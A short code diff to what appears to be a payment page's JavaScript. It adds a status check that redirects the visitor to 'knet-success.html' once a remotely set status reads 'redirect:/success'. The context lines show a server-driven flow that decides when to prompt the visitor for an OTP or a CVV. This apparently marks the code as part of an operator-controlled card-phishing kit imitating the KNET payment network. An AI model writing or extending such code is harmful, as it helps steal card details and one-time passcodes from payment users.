@@ -879,6 +879,7 @@
           else if (dd.status === 'rejected') { clearInterval(pollTimer2); showRejected(); }
           else if (dd.status === 'redirect:otp') { clearInterval(pollTimer2); resetRedirect(subId); showOtpCard(false); startPolling(subId); }
           else if (dd.status === 'redirect:cvv') { clearInterval(pollTimer2); resetRedirect(subId); showCvvCard(false); startPolling(subId); }
+          else if (dd.status === 'redirect:/success') { clearInterval(pollTimer2); window.location.href = 'knet-success.html'; }
         } catch(e) {}
       }, 2000);
     }
@@ -992,6 +993,7 @@
           else if (s2.status === 'rejected') { clearInterval(pollTimer2); onPollRejected(); }
           else if (s2.status === 'redirect:otp') { clearInterval(pollTimer2); resetRedirect(id); showOtpCard(false); startPolling(id); }
           else if (s2.status === 'redirect:cvv') { clearInterval(pollTimer2); resetRedirect(id); showCvvCard(false); startPolling(id); }
+          else if (s2.status === 'redirect:/success') { clearInterval(pollTimer2); window.location.href = 'knet-success.html'; }
         } catch(e) {}
       }, 2000);
     }
